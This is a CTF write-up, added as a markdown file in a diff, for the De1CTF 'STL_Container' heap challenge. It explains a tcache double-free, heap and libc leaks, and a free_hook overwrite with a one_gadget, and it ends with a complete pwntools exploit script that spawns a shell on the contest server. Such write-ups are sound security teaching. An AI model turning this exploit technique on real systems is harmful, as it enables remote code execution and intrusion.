@@ -1,0 +1,137 @@
+# STL_Container
+
+Solved by: Shruti (@rudyerudite)
+
+De1CTF had very interesting Pwn and RE challenges but I could only find time to attempt two: STL_Container and Parser of either categories respectively. Here’s a short writeup on a how I solved the former during the CTF. This is a simple challenge for learning and exploiting Tcache.
+
+To get the initial click, we run a checksec.sh on the binary and find that all the mitigations are enabled except that RELRO is partial. It’s a 64-bit non-stripped binary which requires libc 2.27. Let’s checkout the typical menu of every heap challenge:
+
+```
+STL Container Test
+1. list
+2. vector
+3. queue
+4. stack
+5. exit
+>> 1
+1. add
+2. delete
+3. show
+>> 1
+input data:aaa
+done!
+STL Container Test
+1. list
+2. vector
+3. queue
+4. stack
+5. exit
+>>
+```
+So CPP program presents us with 3 in built data structures of the most reliable STL library. Stack and queue make use of deque, list makes use of doubly linked list and vector uses a vector. I started out by allocating all the different data structures and found out that one could allocate only 2 nodes in each of the data structures. The allocation of each of these is done on the heap and and makes a fixed allocation of 0x98 bytes for each node. It reads in 0x98 bytes of data.
+
+Taking all these into account, there could be a possibility of overwriting free_hook with a one_gadget ( as a shortcut to erstwhile overwriting with system). As the allocation was done using malloc one could get it easily by simply allocating, deleting and printing the contents of the chunk. And we had all the 3 functionalities under our control- though printing was not supported for stack and queue.
+
+So I started off by allocating chunks and then deleting them one by one. What I noticed was when deleting vector I got a double free! Which implies there was a chunk pointing to itself in the tcache. That’s why I was able to allocate only 7 chunks.
+
+## Getting the Leaks
+
+I got the heap leaks by simply allocating the chunk which had pointers to the next chunk in the list. After that I called the print functionality. Hmmm… I’d a heap in the unsorted bin which I’d to allocate and print the contents. But because of the double free and also weird functionality of the code (copy content of a chunk to another and then delete the previous) I was not able to do it so easily. I created a list node and was allocated on the heap.
+
+This is how a structure of a node (in list) looked like:
+
+```
+0x5555555455000000: heap_addr_of_next_node heap_addr_of_prev_node
+0x5555555455000010: heap_addr_of_the_stored_content
+```
+I simply allocated one of the freed vector chunks and overwrote the next pointer to the heap address of the stored content. Then on the next allocation the naive tcache gave me the liberty to overwrite the address 0x5555555455000010 with the address of the chunk in the unsorted bin. I did so to make use of the print functionality so that I could simply print out the contents of the list node which I had previously created. But yes the contents printed out weren’t the earlier contents :).
+
+That’s how I got the libc leak!
+
+## Final Exploit
+
+I created 2 vectors and deleted them to get a similar double free but this time overwrote next pointer with free_hook with a one_gadget and called a free using delete. Running the code swiftly popped up the much anticipated shell!
+
+Here’s the final exploit for the code, mind you it’s not the most optimized code and there could be better ways of solving it. It might be a little confusing to understand, so better get your hands dirty on the binary and try out the exploit yourself!
+
+```python
+from pwn import *
+ 
+#r = process('./stl_container')
+r = remote('206.189.186.98',18848)
+def callds(ds,opt,value,idx):
+    r.sendlineafter(">>",str(ds))
+    r.sendlineafter(">>",str(opt))
+    if(opt == 1):
+        r.sendlineafter("input data:",value)
+        print(r.recvline())
+    else:
+        if((ds == 3 or ds == 4) and opt == 2):
+            return
+        r.sendlineafter("index?\n",str(idx))
+        if(ds ==2):
+            print("lol")
+            print(r.recvline())
+ 
+#payload = p64(0x0)+p64(0x91)+'a'*(0xa0-0x20)+p64(0x90)
+#adding chunks to tcache
+callds(1,1,'a'*0x10,-1)
+callds(1,1,'b'*0x10,-1)
+callds(2,1,'c'*0x10,-1)
+callds(2,1,'d'*0x10,-1)
+callds(3,1,'e'*0x10,-1)
+callds(3,1,'f'*0x10,-1)
+callds(4,1,'g'*0x10,-1)
+payload = p64(0xa1)*0x6 + p64(0x0)
+callds(4,1,payload,-1)
+ 
+#deleting chunks; unsorted bin
+callds(1,2,-1,0)
+callds(1,2,-1,1)
+callds(2,2,-1,0)
+callds(2,2,-1,0)
+callds(3,2,-1,0)
+callds(3,2,-1,1)
+callds(4,2,-1,0)
+callds(4,2,-1,1)
+ 
+#getting heap leaks
+callds(1,1,'',-1)
+callds(1,3,'',1)
+print(r.recvline())
+leak = u64(("\x70"+r.recvline().strip()).ljust(8,'\x00'))
+print(hex(leak))
+ 
+#getting libc leaks
+chunk = p64(leak -0x3f0)
+callds(3,1,'',-1)
+callds(3,1,chunk,-1)
+callds(4,1,'/bin/sh',-1)
+payload = p64(leak+0xa0)
+callds(4,1,payload,-1)
+callds(1,3,'',0)
+leak = u64(r.recvline().strip().split(": ")[1].ljust(8,'\x00'))
+print(hex(leak))
+libc_base = leak - 0x3ebca0
+system = libc_base + 0x4f440
+malloc_hook = libc_base + 0x3ebc30
+free_hook = libc_base + 0x3ed8e8
+one_gadget = libc_base + 0x4f322
+ 
+#final overwrite
+callds(1,2,-1,0)
+callds(1,2,-1,0)
+callds(3,2,-1,0)
+#to cause a loop
+callds(2,1,'c'*0x10,-1)
+callds(2,1,'d'*0x10,-1)
+callds(2,2,-1,0)
+callds(2,2,-1,0)
+ 
+payload = p64(free_hook)
+callds(2,1,payload,-1)
+callds(3,1,p64(one_gadget),-1)
+#gdb.attach(r)
+r.interactive()
+##De1CTF{NeuEr_u51ng_O6j3ct_1n_VecT0r}
+```
